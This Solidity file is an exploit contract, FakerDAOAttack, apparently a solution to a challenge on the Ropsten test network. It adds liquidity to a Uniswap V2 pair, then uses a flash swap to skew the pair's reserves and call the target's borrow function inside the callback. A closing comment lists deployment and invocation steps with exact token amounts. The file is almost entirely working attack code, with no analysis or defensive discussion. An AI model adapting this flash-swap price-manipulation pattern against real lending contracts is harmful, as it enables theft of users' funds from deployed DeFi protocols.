import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FakerDAOAttack is IUniswapV2Callee {
    using SafeMath for uint256;

    address instance;

    function attack (address _instance, address _pair, uint256 amount0Out, uint256 amount1Out) public {
        instance = _instance;
        (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();
        address token0 = Pair(_pair).token0();
        address token1 = Pair(_pair).token1();
        address _router = $.UniswapV2_ROUTER02;

        IERC20(token0).approve(_router, uint256(-1));
        IERC20(token1).approve(_router, uint256(-1));
        IERC20(_pair).approve(instance, uint256(-1));
        (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(
          token0,
          token1,
          1500 * 10 ** 18,
          1500 * 10 ** 18,
          1, 1, address(this), uint256(-1));


        Pair(_pair).swap(
          amount0Out,
          amount1Out,
          address(this),
          bytes('not empty')
        );
    }

    function uniswapV2Call(
        address _sender,
        uint _amount0,
        uint _amount1,
        bytes calldata _data
      ) external override {
        address[] memory path = new address[](2);
        uint amountToken = _amount0 == 0 ? _amount1 : _amount0;

        address token0 = Pair(msg.sender).token0();
        address token1 = Pair(msg.sender).token1();

        require(
          msg.sender == UniswapV2Library.pairFor($.UniswapV2_FACTORY, token0, token1),
          'Unauthorized'
        );

        FakerDAO(instance).borrow(1);

        IERC20(token0).transfer(msg.sender, IERC20(token0).balanceOf(address(this)));
        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
    }
}

library $
{
	address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten
	address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten
}

interface FakerDAO is IERC20 {
    function borrow(uint256 _amount) external;
}

interface IUniswapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint);

  function getPair(address tokenA, address tokenB) external view returns (address pair);
  function allPairs(uint) external view returns (address pair);
  function allPairsLength() external view returns (uint);

  function feeTo() external view returns (address);
  function feeToSetter() external view returns (address);

  function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
	function WETH() external pure returns (address _token);
	function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);
	function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);
	function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);
	function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);
	function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);
}

interface Pair is IERC20
{
	function token0() external view returns (address _token0);
	function token1() external view returns (address _token1);
	function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);
	function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);
	function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
	function mint(address _to) external returns (uint256 _liquidity);
	function sync() external;
	function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}


/**
 * steps:
 * 1) get token0 and token1 on contract.pair
 * 2) deploy FakerDAOAttack
 * 3) token0.transfer(FakerDAOAttack, 5000000000000000000000)
 * 4) token1.transfer(FakerDAOAttack, 5000000000000000000000)
 * 5) FakerDAOAttack.attack(instance, pair, 1, 999999999999999999999999)
*/
